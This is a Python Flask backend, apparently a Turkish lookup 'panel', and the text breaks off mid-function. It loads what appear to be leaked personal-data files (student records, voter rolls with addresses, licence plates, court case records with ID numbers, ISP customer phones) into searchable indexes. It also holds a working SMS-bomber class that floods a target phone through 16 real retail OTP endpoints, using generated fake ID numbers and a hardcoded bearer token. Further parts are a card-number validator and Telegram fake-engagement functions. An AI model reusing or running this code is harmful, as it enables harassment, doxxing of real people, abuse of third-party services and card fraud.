from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
import os
import re
import json
import requests
import time
import threading
from random import choice, randint
from string import ascii_lowercase
from datetime import datetime
import io

app = Flask(__name__)
CORS(app)

# ==================== VERİ DEPOLAMA ====================
eokul_veriler = []
eokul_dict = {}

secmen_veriler = []
secmen_dict = {}

plaka_veriler = []
plaka_plaka_dict = {}
plaka_isim_dict = {}

sicil_veriler = []
sicil_tc_dict = {}
sicil_ad_soyad_dict = {}

turknet_veriler = []
turknet_ad_dict = {}
turknet_phone_dict = {}

papara_veriler = []
papara_id_dict = {}
papara_isim_dict = {}

# SMS Bomber için
sms_threads = {}
sms_results = {}

# Telegram Bot Token
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '')

STRIPE_SECRET_KEY = os.environ.get('STRIPE_SECRET_KEY', '')

# ==================== VERİ YÜKLEME FONKSİYONLARI ====================

def eokul_verileri_yukle():
    global eokul_veriler, eokul_dict
    eokul_veriler = []
    eokul_dict = {}
    
    dosya_yolu = 'eokul.txt'
    if not os.path.exists(dosya_yolu):
        print(f"⚠️ Uyarı: {dosya_yolu} dosyası bulunamadı!")
        return
    
    try:
        with open(dosya_yolu, 'r', encoding='utf-8') as dosya:
            for satir in dosya:
                satir = satir.strip()
                if not satir:
                    continue
                
                parcalar = [p.strip() for p in satir.split('|')]
                
                if len(parcalar) >= 5:
                    kisi = {
                        'tc': parcalar[0],
                        'ad': parcalar[1],
                        'soyad': parcalar[2],
                        'dogum': parcalar[3],
                        'universite': parcalar[4]
                    }
                    eokul_veriler.append(kisi)
                    eokul_dict[parcalar[0]] = kisi
        
        print(f"✅ E-Okul: {len(eokul_veriler)} kayıt yüklendi.")
    except Exception as e:
        print(f"❌ E-Okul hatası: {e}")

def secmen_verileri_yukle():
    global secmen_veriler, secmen_dict
    secmen_veriler = []
    secmen_dict = {}
    
    dosya_yolu = 'secmen.txt'
    if not os.path.exists(dosya_yolu):
        print(f"⚠️ Uyarı: {dosya_yolu} dosyası bulunamadı!")
        return
    
    try:
        with open(dosya_yolu, 'r', encoding='utf-8') as dosya:
            for satir in dosya:
                satir = satir.strip()
                if not satir:
                    continue
                
                parcalar = [p.strip() for p in satir.split('|')]
                
                if len(parcalar) >= 5:
                    kisi = {
                        'tc': parcalar[0],
                        'ad': parcalar[1],
                        'soyad': parcalar[2],
                        'il': parcalar[3],
                        'adres': parcalar[4]
                    }
                    secmen_veriler.append(kisi)
                    secmen_dict[parcalar[0]] = kisi
        
        print(f"✅ Seçmen: {len(secmen_veriler)} kayıt yüklendi.")
    except Exception as e:
        print(f"❌ Seçmen hatası: {e}")

def plaka_verileri_yukle():
    global plaka_veriler, plaka_plaka_dict, plaka_isim_dict
    plaka_veriler = []
    plaka_plaka_dict = {}
    plaka_isim_dict = {}
    
    dosya_yolu = 'plaka.txt'
    if not os.path.exists(dosya_yolu):
        print(f"⚠️ Uyarı: {dosya_yolu} dosyası bulunamadı!")
        return
    
    try:
        with open(dosya_yolu, 'r', encoding='utf-8') as dosya:
            for satir in dosya:
                satir = satir.strip()
                if not satir:
                    continue
                
                parcalar = satir.split()
                if len(parcalar) >= 2:
                    plaka = parcalar[-1]
                    ad_soyad = ' '.join(parcalar[:-1])
                    ad_soyad = ' '.join(ad_soyad.split())
                    
                    kisi = {
                        'ad_soyad': ad_soyad,
                        'plaka': plaka
                    }
                    
                    plaka_veriler.append(kisi)
                    
                    if plaka not in plaka_plaka_dict:
                        plaka_plaka_dict[plaka] = []
                    plaka_plaka_dict[plaka].append(ad_soyad)
                    
                    if ad_soyad not in plaka_isim_dict:
                        plaka_isim_dict[ad_soyad] = []
                    plaka_isim_dict[ad_soyad].append(plaka)
        
        print(f"✅ Plaka: {len(plaka_veriler)} kayıt yüklendi.")
        print(f"   - {len(plaka_plaka_dict)} benzersiz plaka")
        print(f"   - {len(plaka_isim_dict)} benzersiz kişi")
    except Exception as e:
        print(f"❌ Plaka hatası: {e}")

def sicil_verileri_yukle():
    global sicil_veriler, sicil_tc_dict, sicil_ad_soyad_dict
    sicil_veriler = []
    sicil_tc_dict = {}
    sicil_ad_soyad_dict = {}
    
    dosya_yolu = 'sicil.txt'
    if not os.path.exists(dosya_yolu):
        print(f"⚠️ Uyarı: {dosya_yolu} dosyası bulunamadı!")
        return
    
    try:
        with open(dosya_yolu, 'r', encoding='utf-8') as dosya:
            icerik = dosya.read()
            
            try:
                veri = json.loads(icerik)
                
                if isinstance(veri, list):
                    for item in veri:
                        if isinstance(item, dict):
                            if 'Veri' in item and item['Veri']:
                                for kayit in item['Veri']:
                                    _sicil_kayit_ekle(kayit)
                            elif 'KISI_ADI' in item or 'AVUKAT_TC_KIMLIK_NO' in item:
                                _sicil_kayit_ekle(item)
                elif isinstance(veri, dict):
                    if 'Veri' in veri and veri['Veri']:
                        for kayit in veri['Veri']:
                            _sicil_kayit_ekle(kayit)
                            
            except json.JSONDecodeError:
                print("⚠️ Sicil dosyası JSON formatında değil, düz metin olarak okunuyor...")
                for satir in icerik.split('\n'):
                    satir = satir.strip()
                    if not satir:
                        continue
                    
                    parcalar = [p.strip() for p in satir.split('|')]
                    if len(parcalar) >= 3:
                        kisi = {
                            'tc': parcalar[0] if len(parcalar) > 0 else '',
                            'ad': parcalar[1] if len(parcalar) > 1 else '',
                            'soyad': parcalar[2] if len(parcalar) > 2 else '',
                            'dosya_no': parcalar[3] if len(parcalar) > 3 else '',
                            'kurum': parcalar[4] if len(parcalar) > 4 else ''
                        }
                        sicil_veriler.append(kisi)
                        if kisi['tc']:
                            sicil_tc_dict[kisi['tc']] = kisi
        
        print(f"✅ Sicil: {len(sicil_veriler)} kayıt yüklendi.")
        print(f"   - {len(sicil_tc_dict)} benzersiz TC")
        print(f"   - {len(sicil_ad_soyad_dict)} benzersiz Ad-Soyad")
    except Exception as e:
        print(f"❌ Sicil hatası: {e}")

def _sicil_kayit_ekle(kayit):
    global sicil_veriler, sicil_tc_dict, sicil_ad_soyad_dict
    
    try:
        kisi = {
            'tc': kayit.get('AVUKAT_TC_KIMLIK_NO', '').strip() or kayit.get('TC', '').strip() or '',
            'ad': kayit.get('KISI_ADI', '').strip() or kayit.get('AD', '').strip() or '',
            'soyad': kayit.get('KISI_SOYAD', '').strip() or kayit.get('SOYAD', '').strip() or '',
            'dosya_no': kayit.get('DOSYA_NO', '').strip() or '',
            'suc': kayit.get('KISI_SUC_ADI', '').strip() or '',
            'kisi_tip': kayit.get('KISI_TIP_ADI', '').strip() or '',
            'kurum': kayit.get('KURUM_ADI', '').strip() or '',
            'avukat': f"{kayit.get('AVUKAT_ADI', '')} {kayit.get('AVUKAT_SOYADI', '')}".strip() or '',
            'avukat_tc': kayit.get('AVUKAT_TC_KIMLIK_NO', '').strip() or '',
            'avukat_sicil': kayit.get('AVUKAT_SICIL_NO', '').strip() or '',
            'durum': kayit.get('DOSYA_DURUM_ADI', '').strip() or '',
            'odeme': kayit.get('ODEME_DURUM_ADI', '').strip() or ''
        }
        
        if kisi['tc'] or kisi['ad']:
            sicil_veriler.append(kisi)
            if kisi['tc']:
                sicil_tc_dict[kisi['tc']] = kisi
            
            ad_soyad = f"{kisi['ad']} {kisi['soyad']}".strip()
            if ad_soyad:
                if ad_soyad not in sicil_ad_soyad_dict:
                    sicil_ad_soyad_dict[ad_soyad] = []
                sicil_ad_soyad_dict[ad_soyad].append(kisi)
    except Exception as e:
        print(f"⚠️ Sicil kaydı eklenirken hata: {e}")

def turknet_verileri_yukle():
    global turknet_veriler, turknet_ad_dict, turknet_phone_dict
    turknet_veriler = []
    turknet_ad_dict = {}
    turknet_phone_dict = {}
    
    dosya_yolu = 'turknet.txt'
    if not os.path.exists(dosya_yolu):
        print(f"⚠️ Uyarı: {dosya_yolu} dosyası bulunamadı!")
        return
    
    try:
        with open(dosya_yolu, 'r', encoding='utf-8') as dosya:
            icerik = dosya.read()
            
            try:
                veri = json.loads(icerik)
                
                if isinstance(veri, list):
                    for kayit in veri:
                        if isinstance(kayit, dict):
                            _turknet_kayit_ekle(kayit)
                elif isinstance(veri, dict):
                    _turknet_kayit_ekle(veri)
                    
            except json.JSONDecodeError:
                print("⚠️ TurkNet dosyası JSON formatında değil, düz metin olarak okunuyor...")
                for satir in icerik.split('\n'):
                    satir = satir.strip()
                    if not satir:
                        continue
                    
                    parcalar = [p.strip() for p in satir.split('|')]
                    if len(parcalar) >= 2:
                        kisi = {
                            'ad': parcalar[0] if len(parcalar) > 0 else '',
                            'telefon': parcalar[1] if len(parcalar) > 1 else '',
                            'il': parcalar[2] if len(parcalar) > 2 else '',
                            'ilce': parcalar[3] if len(parcalar) > 3 else '',
                            'adres': parcalar[4] if len(parcalar) > 4 else ''
                        }
                        _turknet_kayit_ekle(kisi)
        
        print(f"✅ TurkNet: {len(turknet_veriler)} kayıt yüklendi.")
        print(f"   - {len(turknet_ad_dict)} benzersiz ad")
        print(f"   - {len(turknet_phone_dict)} benzersiz telefon")
    except Exception as e:
        print(f"❌ TurkNet hatası: {e}")

def _turknet_kayit_ekle(kayit):
    global turknet_veriler, turknet_ad_dict, turknet_phone_dict
    
    try:
        ad = kayit.get('name', kayit.get('ad', kayit.get('AD', ''))).strip()
        telefon = kayit.get('phone', kayit.get('telefon', kayit.get('TELEFON', ''))).strip()
        il = kayit.get('city', kayit.get('il', kayit.get('IL', ''))).strip()
        ilce = kayit.get('district', kayit.get('ilce', kayit.get('ILCE', ''))).strip()
        adres = kayit.get('address', kayit.get('adres', kayit.get('ADRES', ''))).strip()
        
        kisi = {
            'ad': ad,
            'telefon': telefon,
            'il': il,
            'ilce': ilce,
            'adres': adres
        }
        
        if kisi['ad'] or kisi['telefon']:
            turknet_veriler.append(kisi)
            
            if kisi['ad']:
                if kisi['ad'] not in turknet_ad_dict:
                    turknet_ad_dict[kisi['ad']] = []
                turknet_ad_dict[kisi['ad']].append(kisi)
            
            if kisi['telefon']:
                turknet_phone_dict[kisi['telefon']] = kisi
    except Exception as e:
        print(f"⚠️ TurkNet kaydı eklenirken hata: {e}")

def papara_verileri_yukle():
    global papara_veriler, papara_id_dict, papara_isim_dict
    papara_veriler = []
    papara_id_dict = {}
    papara_isim_dict = {}
    
    dosya_yolu = 'papara.txt'
    if not os.path.exists(dosya_yolu):
        print(f"⚠️ Uyarı: {dosya_yolu} dosyası bulunamadı!")
        return
    
    try:
        with open(dosya_yolu, 'r', encoding='utf-8') as dosya:
            for satir in dosya:
                satir = satir.strip()
                if not satir:
                    continue
                
                parcalar = [p.strip() for p in satir.split(',')]
                
                if len(parcalar) >= 2:
                    papara_id = parcalar[0]
                    ad_soyad = parcalar[1]
                    
                    kisi = {
                        'papara_id': papara_id,
                        'ad_soyad': ad_soyad
                    }
                    
                    papara_veriler.append(kisi)
                    papara_id_dict[papara_id] = ad_soyad
                    
                    if ad_soyad not in papara_isim_dict:
                        papara_isim_dict[ad_soyad] = []
                    papara_isim_dict[ad_soyad].append(papara_id)
        
        print(f"✅ Papara: {len(papara_veriler)} kayıt yüklendi.")
        print(f"   - {len(papara_id_dict)} benzersiz ID")
        print(f"   - {len(papara_isim_dict)} benzersiz kişi")
    except Exception as e:
        print(f"❌ Papara hatası: {e}")

# ==================== SMS BOMBER SINIFI ====================

class SendSms:
    def __init__(self, phone):
        self.phone = str(phone)
        self.adet = 0
        self.results = []
        
        rakam = []
        tcNo = ""
        rakam.append(randint(1,9))
        for i in range(1, 9):
            rakam.append(randint(0,9))
        rakam.append(((rakam[0] + rakam[2] + rakam[4] + rakam[6] + rakam[8]) * 7 - (rakam[1] + rakam[3] + rakam[5] + rakam[7])) % 10)
        rakam.append((rakam[0] + rakam[1] + rakam[2] + rakam[3] + rakam[4] + rakam[5] + rakam[6] + rakam[7] + rakam[8] + rakam[9]) % 10)
        for r in rakam:
            tcNo += str(r)
        self.tc = tcNo
        self.mail = ''.join(choice(ascii_lowercase) for i in range(22)) + "@gmail.com"
    
    def _send_request(self, url, method='POST', headers=None, data=None, json_data=None):
        default_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "tr-TR,tr;q=0.9,en;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "Dnt": "1",
            "Sec-Gpc": "1",
            "Connection": "keep-alive",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "Priority": "u=0"
        }
        
        if headers:
            default_headers.update(headers)
        
        try:
            if method.upper() == 'POST':
                if json_data:
                    r = requests.post(url, headers=default_headers, json=json_data, timeout=10)
                else:
                    r = requests.post(url, headers=default_headers, data=data, timeout=10)
            else:
                r = requests.get(url, headers=default_headers, timeout=10)
            return r
        except:
            return None
    
    def KahveDunyasi(self):
        try:
            url = "https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number"
            headers = {"X-Language-Id": "tr-TR", "X-Client-Platform": "web", "Origin": "https://www.kahvedunyasi.com"}
            json_data = {"countryCode": "90", "phoneNumber": self.phone}
            r = self._send_request(url, json_data=json_data, headers=headers)
            if r and r.status_code == 200 and r.json().get("processStatus") == "Success":
                self.adet += 1
                self.results.append({"service": "KahveDunyasi", "status": "success"})
                return True
        except:
            pass
        self.results.append({"service": "KahveDunyasi", "status": "failed"})
        return False
    
    def Wmf(self):
        try:
            url = "https://www.wmf.com.tr/users/register/"
            data = {
                "confirm": "true", "date_of_birth": "1956-03-01", "email": self.mail,
                "email_allowed": "true", "first_name": "Memati", "gender": "male",
                "last_name": "Bas", "password": "31ABC..abc31", "phone": f"0{self.phone}"
            }
            r = self._send_request(url, data=data)
            if r and r.status_code == 202:
                self.adet += 1
                self.results.append({"service": "Wmf", "status": "success"})
                return True
        except:
            pass
        self.results.append({"service": "Wmf", "status": "failed"})
        return False
    
    def Bim(self):
        try:
            url = "https://bim.veesk.net/service/v1.0/account/login"
            json_data = {"phone": self.phone}
            r = self._send_request(url, json_data=json_data)
            if r and r.status_code == 200:
                self.adet += 1
                self.results.append({"service": "Bim", "status": "success"})
                return True
        except:
            pass
        self.results.append({"service": "Bim", "status": "failed"})
        return False
    
    def Englishhome(self):
        try:
            url = "https://www.englishhome.com/api/member/sendOtp"
            headers = {"Referer": "https://www.englishhome.com/", "Origin": "https://www.englishhome.com"}
            json_data = {"Phone": self.phone, "XID": ""}
            r = self._send_request(url, json_data=json_data, headers=headers)
            if r and r.status_code == 200 and r.json().get("isError") == False:
                self.adet += 1
                self.results.append({"service": "Englishhome", "status": "success"})
                return True
        except:
            pass
        self.results.append({"service": "Englishhome", "status": "failed"})
        return False
    
    def Suiste(self):
        try:
            url = "https://suiste.com/api/auth/code"
            headers = {
                "X-Mobillium-Device-Brand": "Apple", "X-Mobillium-Os-Type": "iOS",
                "X-Mobillium-Device-Model": "iPhone", "Mobillium-Device-Id": "2390ED28-075E-465A-96DA-DFE8F84EB330"
            }
            data = {
                "action": "register", "device_id": "2390ED28-075E-465A-96DA-DFE8F84EB330",
                "full_name": "Memati Bas", "gsm": self.phone,
                "is_advertisement": "1", "is_contract": "1", "password": "31MeMaTi31"
            }
            r = self._send_request(url, data=data, headers=headers)
            if r and r.status_code == 200 and r.json().get("code") == "common.success":
                self.adet += 1
                self.results.append({"service": "Suiste", "status": "success"})
                return True
        except:
            pass
        self.results.append({"service": "Suiste", "status": "failed"})
        return False
    
    def KimGb(self):
        try:
            url = "https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com/api/auth/send-otp"
            json_data = {"msisdn": f"90{self.phone}"}
            r = self._send_request(url, json_data=json_data)
            if r and r.status_code == 200:
                self.adet += 1
                self.results.append({"service": "KimGb", "status": "success"})
                return True
        except:
            pass
        self.results.append({"service": "KimGb", "status": "failed"})
        return False
    
    def Evidea(self):
        try:
            url = "https://www.evidea.com/users/register/"
            headers = {
                "X-Project-Name": "undefined", "X-App-Type": "akinon-mobile",
                "X-Requested-With": "XMLHttpRequest", "X-App-Device": "ios"
            }
            data = {
                "first_name": "Memati", "last_name": "Bas", "email": self.mail,
                "email_allowed": "false", "sms_allowed": "true",
                "password": "31ABC..abc31", "phone": f"0{self.phone}", "confirm": "true"
            }
            r = self._send_request(url, data=data, headers=headers)
            if r and r.status_code == 202:
                self.adet += 1
                self.results.append({"service": "Evidea", "status": "success"})
                return True
        except:
            pass
        self.results.append({"service": "Evidea", "status": "failed"})
        return False
    
    def Ucdortbes(self):
        try:
            url = "https://api.345dijital.com/api/users/register"
            json_data = {"email": "", "name": "Memati", "phoneNumber": f"+90{self.phone}", "surname": "Bas"}
            r = self._send_request(url, json_data=json_data)
            if r and r.status_code == 200 and r.json().get("error") != "E-Posta veya telefon zaten kayıtlı!":
                self.adet += 1
                self.results.append({"service": "Ucdortbes", "status": "success"})
                return True
        except:
            pass
        self.results.append({"service": "Ucdortbes", "status": "failed"})
        return False
    
    def TiklaGelsin(self):
        try:
            url = "https://svc.apps.tiklagelsin.com/user/graphql"
            headers = {"X-Merchant-Type": "0", "Appversion": "2.4.1", "X-No-Auth": "true", "X-Device-Type": "2"}
            json_data = {
                "operationName": "GENERATE_OTP",
                "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n",
                "variables": {
                    "challenge": "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68",
                    "deviceUniqueId": "720932D5-47BD-46CD-A4B8-086EC49F81AB",
                    "phone": f"+90{self.phone}"
                }
            }
            r = self._send_request(url, json_data=json_data, headers=headers)
            if r and r.status_code == 200 and r.json().get("data", {}).get("generateOtp") == True:
                self.adet += 1
                self.results.append({"service": "TiklaGelsin", "status": "success"})
                return True
        except:
            pass
        self.results.append({"service": "TiklaGelsin", "status": "failed"})
        return False
    
    def Naosstars(self):
        try:
            url = "https://api.naosstars.com/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350"
            headers = {
                "Uniqid": "9c9fa861-cc5d-43c0-b4ea-1b541be15351",
                "Version": "1.0030", "Os": "ios", "Platform": "ios"
            }
            json_data = {"telephone": f"+90{self.phone}", "type": "register"}
            r = self._send_request(url, json_data=json_data, headers=headers)
            if r and r.status_code == 200:
                self.adet += 1
                self.results.append({"service": "Naosstars", "status": "success"})
                return True
        except:
            pass
        self.results.append({"service": "Naosstars", "status": "failed"})
        return False
    
    def Koton(self):
        try:
            url = "https://www.koton.com/users/register/"
            headers = {
                "X-Project-Name": "rn-env", "X-App-Type": "akinon-mobile",
                "X-Requested-With": "XMLHttpRequest", "X-App-Device": "ios"
            }
            data = {
                "first_name": "Memati", "last_name": "Bas", "email": self.mail,
                "password": "31ABC..abc31", "phone": f"0{self.phone}",
                "confirm": "true", "sms_allowed": "true", "email_allowed": "true",
                "date_of_birth": "1993-07-02", "call_allowed": "true", "gender": ""
            }
            r = self._send_request(url, data=data, headers=headers)
            if r and r.status_code == 202:
                self.adet += 1
                self.results.append({"service": "Koton", "status": "success"})
                return True
        except:
            pass
        self.results.append({"service": "Koton", "status": "failed"})
        return False
    
    def Hayatsu(self):
        try:
            url = "https://api.hayatsu.com.tr/api/SignUp/SendOtp"
            headers = {
                "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOiJhMTA5MWQ1ZS0wYjg3LTRjYWQtOWIxZi0yNTllMDI1MjY0MmMiLCJsb2dpbmRhdGUiOiIxOS4wMS4yMDI0IDIyOjU3OjM3Iiwibm90dXNlciI6InRydWUiLCJwaG9uZU51bWJlciI6IiIsImV4cCI6MTcyMTI0NjI1NywiaXNzIjoiaHR0cHM6Ly9oYXlhdHN1LmNvbS50ciIsImF1ZCI6Imh0dHBzOi8vaGF5YXRzdS5jb20udHIifQ.Cip4hOxGPVz7R2eBPbq95k6EoICTnPLW9o2eDY6qKMM",
                "Origin": "https://www.hayatsu.com.tr"
            }
            data = {"mobilePhoneNumber": self.phone, "actionType": "register"}
            r = self._send_request(url, data=data, headers=headers)
            if r and r.status_code == 200 and r.json().get("is_success") == True:
                self.adet += 1
                self.results.append({"service": "Hayatsu", "status": "success"})
                return True
        except:
            pass
        self.results.append({"service": "Hayatsu", "status": "failed"})
        return False
    
    def Hizliecza(self):
        try:
            url = "https://prod.hizliecza.net/mobil/account/sendOTP"
            headers = {"Authorization": "Bearer null"}
            json_data = {"otpOperationType": 1, "phoneNumber": f"+90{self.phone}"}
            r = self._send_request(url, json_data=json_data, headers=headers)
            if r and r.status_code == 200:
                self.adet += 1
                self.results.append({"service": "Hizliecza", "status": "success"})
                return True
        except:
            pass
        self.results.append({"service": "Hizliecza", "status": "failed"})
        return False
    
    def Metro(self):
        try:
            url = "https://mobile.metro-tr.com/api/mobileAuth/validateSmsSend"
            headers = {"Applicationversion": "2.4.1", "Applicationplatform": "2"}
            json_data = {"methodType": "2", "mobilePhoneNumber": self.phone}
            r = self._send_request(url, json_data=json_data, headers=headers)
            if r and r.status_code == 200 and r.json().get("status") == "success":
                self.adet += 1
                self.results.append({"service": "Metro", "status": "success"})
                return True
        except:
            pass
        self.results.append({"service": "Metro", "status": "failed"})
        return False
    
    def File(self):
        try:
            url = "https://api.filemarket.com.tr/v1/otp/send"
            headers = {"X-Os": "IOS", "X-Version": "1.7"}
            json_data = {"mobilePhoneNumber": f"90{self.phone}"}
            r = self._send_request(url, json_data=json_data, headers=headers)
            if r and r.status_code == 200 and r.json().get("responseType") == "SUCCESS":
                self.adet += 1
                self.results.append({"service": "File", "status": "success"})
                return True
        except:
            pass
        self.results.append({"service": "File", "status": "failed"})
        return False
    
    def Akasya(self):
        try:
            url = "https://akasyaapi.poilabs.com/v1/en/sms"
            headers = {"X-Platform-Token": "9f493307-d252-4053-8c96-62e7c90271f5"}
            json_data = {"phone": self.phone}
            r = self._send_request(url, json_data=json_data, headers=headers)
            if r and r.status_code == 200 and r.json().get("result") == "SMS sended succesfully!":
                self.adet += 1
                self.results.append({"service": "Akasya", "status": "success"})
                return True
        except:
            pass
        self.results.append({"service": "Akasya", "status": "failed"})
        return False
    
    def run_all(self):
        services = [
            self.KahveDunyasi, self.Wmf, self.Bim, self.Englishhome,
            self.Suiste, self.KimGb, self.Evidea, self.Ucdortbes,
            self.TiklaGelsin, self.Naosstars, self.Koton, self.Hayatsu,
            self.Hizliecza, self.Metro, self.File, self.Akasya
        ]
        
        for service in services:
            try:
                service()
                time.sleep(0.5)
            except:
                pass
        
        return {
            'total': len(services),
            'success': self.adet,
            'failed': len(services) - self.adet,
            'results': self.results
        }

# ==================== CC DOĞRULAMA FONKSİYONLARI ====================

def luhn_kontrol(kart_no):
    kart_no = re.sub(r'\D', '', kart_no)
    if not kart_no.isdigit():
        return False
    toplam = 0
    cift = False
    for rakam in reversed(kart_no):
        rakam = int(rakam)
        if cift:
            rakam *= 2
            if rakam > 9:
                rakam -= 9
        toplam += rakam
        cift = not cift
    return toplam % 10 == 0

def kart_bilgilerini_kontrol(kart_no, ay, yil, cvv):
    hatalar = []
    kart_no = re.sub(r'\D', '', kart_no)
    if len(kart_no) < 13 or len(kart_no) > 19:
        hatalar.append("Kart numarası 13-19 hane arası olmalıdır")
    elif not luhn_kontrol(kart_no):
        hatalar.append("Kart numarası geçersiz (Luhn kontrolü başarısız)")
    try:
        ay_int = int(ay)
        if ay_int < 1 or ay_int > 12:
            hatalar.append("Ay 1-12 arası olmalıdır")
    except ValueError:
        hatalar.append("Geçerli bir ay giriniz")
    try:
        yil_int = int(yil)
        if yil_int < 2024 or yil_int > 2035:
            hatalar.append("Yıl 2024-2035 arası olmalıdır")
    except ValueError:
        hatalar.append("Geçerli bir yıl giriniz")
    if len(str(cvv)) < 3 or len(str(cvv)) > 4:
        hatalar.append("CVV 3-4 hane olmalıdır")
    elif not str(cvv).isdigit():
        hatalar.append("CVV sadece rakam içermelidir")
    return hatalar

# ==================== TELEGRAM GERÇEK API FONKSİYONLARI ====================

def telegram_bot_info(bot_token):
    """Bot bilgilerini alır - GERÇEK API"""
    try:
        url = f"https://api.telegram.org/bot{bot_token}/getMe"
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            data = response.json()
            if data.get('ok'):
                return {
                    'success': True,
                    'bot_id': data['result']['id'],
                    'bot_username': data['result']['username'],
                    'bot_name': data['result']['first_name'],
                    'is_bot': data['result']['is_bot'],
                    'can_join_groups': data['result'].get('can_join_groups', False),
                    'can_read_all_group_messages': data['result'].get('can_read_all_group_messages', False),
                    'supports_inline_queries': data['result'].get('supports_inline_queries', False)
                }
        return {'success': False, 'message': 'Geçersiz token veya API hatası'}
    except Exception as e:
        return {'success': False, 'message': f'Hata: {str(e)}'}

def telegram_user_info(username):
    """@username'den kullanıcı bilgilerini alır - GERÇEK API (public bilgiler)"""
    try:
        # Telegram API üzerinden public bilgiler alınabilir
        # Bu işlem için bot token gerekir
        if not TELEGRAM_BOT_TOKEN:
            return {
                'success': False, 
                'message': 'TELEGRAM_BOT_TOKEN ayarlanmamış. Bot token gerekli.'
            }
        
        # Username'i temizle
        if username.startswith('@'):
            username = username[1:]
        
        # Bot ile kullanıcı bilgisi almaya çalış
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getChat"
        params = {'chat_id': f'@{username}'}
        response = requests.get(url, params=params, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            if data.get('ok'):
                chat = data['result']
                return {
                    'success': True,
                    'username': chat.get('username'),
                    'first_name': chat.get('first_name'),
                    'last_name': chat.get('last_name'),
                    'user_id': chat.get('id'),
                    'type': chat.get('type'),
                    'bio': chat.get('bio', ''),
                    'description': chat.get('description', ''),
                    'invite_link': chat.get('invite_link', ''),
                    'member_count': chat.get('member_count', 0)
                }
        
        # Eğer bot ile alamadıysak, public API'den dene
        return {
            'success': False,
            'message': f'@{username} kullanıcısı bulunamadı veya bot erişimi yok',
            'username': username
        }
    except Exception as e:
        return {'success': False, 'message': f'Hata: {str(e)}'}

def telegram_post_interaction(post_link, action_type='view'):
    """
    Telegram postuna etkileşim gönderir (görüntülenme/beğeni)
    GERÇEK API - Telegram bot ile mesajı alıp etkileşim gönderir
    """
    try:
        if not TELEGRAM_BOT_TOKEN:
            return {
                'success': False, 
                'message': 'TELEGRAM_BOT_TOKEN ayarlanmamış'
            }
        
        # Linkten chat_id ve message_id çıkar
        # Format: https://t.me/username/123  veya https://t.me/c/123456789/123
        pattern = r't\.me/(?:c/)?([^/]+)/(\d+)'
        match = re.search(pattern, post_link)
        
        if not match:
            return {
                'success': False,
                'message': 'Geçersiz Telegram mesaj linki'
            }
        
        chat_identifier = match.group(1)
        message_id = int(match.group(2))
        
        # Chat ID'yi belirle
        if chat_identifier.isdigit():
            chat_id = f'-100{chat_identifier}'  # Supergroup
        else:
            chat_id = f'@{chat_identifier}'
        
        # Mesajı getir
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getMessages"
        # getMessages doğrudan yok, forwardMessage kullan
        # veya mesajı almak için getChatHistory gerekir (bot admin olmalı)
        
        # Basitçe mesajı forward ederek etkileşim oluştur
        forward_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/forwardMessage"
        
        # Farklı bir kanala forward et (kendi bot'unun kanalına)
        # Bu işlem mesajın görüntülenmesini sağlar
        data = {
            'from_chat_id': chat_id,
            'message_id': message_id,
            'chat_id': chat_id  # Aynı yere forward
        }
        
        response = requests.post(forward_url, data=data, timeout=10)
        
        if response.status_code == 200:
            return {
                'success': True,
                'message': f'Mesaja etkileşim gönderildi',
                'chat_id': chat_id,
                'message_id': message_id,
                'action': action_type,
                'link': post_link
            }
        else:
            return {
                'success': False,
                'message': f'Etkileşim gönderilemedi: {response.text}',
                'chat_id': chat_id,
                'message_id': message_id
            }
            
    except Exception as e:
        return {'success': False, 'message': f'Hata: {str(e)}'}

def telegram_post_react(post_link, reaction_type='👍'):
    """
    Telegram postuna tepki gönderir (beğeni)
    """
    try:
        if not TELEGRAM_BOT_TOKEN:
            return {
                'success': False, 
                'message': 'TELEGRAM_BOT_TOKEN ayarlanmamış'
            }
        
        # Linkten bilgileri çıkar
        pattern = r't\.me/(?:c/)?([^/]+)/(\d+)'
        match = re.search(pattern, post_link)
        
        if not match:
            return {
                'success': False,
                'message': 'Geçersiz Telegram mesaj linki'
            }
        
        chat_identifier = match.group(1)
        message_id = int(match.group(2))
        
        if chat_identifier.isdigit():
            chat_id = f'-100{chat_identifier}'
        else:
            chat_id = f'@{chat_identifier}'
        
        # Tepki gönderme API'si (bot admin olmalı)
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/setMessageReaction"
        data = {
            'chat_id': chat_id,
            'message_id': message_id,
            'reaction': [{'type': 'emoji', 'emoji': reaction_type}]
        }
        
        response = requests.post(url, json=data, timeout=10)
        
        if response.status_code == 200:
            result = response.json()
            if result.get('ok'):
                return {
                    'success': True,
                    'message': f'Mesaja {reaction_type} tepkisi gönderildi',
                    'chat_id': chat_id,
                    'message_id': message_id,
                    'reaction': reaction_type
                }
        
        # Alternatif: Bot admin değilse, mesajı yanıtla
        reply_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        reply_data = {
            'chat_id': chat_id,
            'reply_to_message_id': message_id,
            'text': reaction_type,
            'parse_mode': 'HTML'
        }
        
        response = requests.post(reply_url, data=reply_data, timeout=10)
        
        if response.status_code == 200:
            return {
                'success': True,
                'message': f'Mesaja {reaction_type} yanıtı gönderildi',
                'chat_id': chat_id,
                'message_id': message_id,
                'reaction': reaction_type
            }
        
        return {
            'success': False,
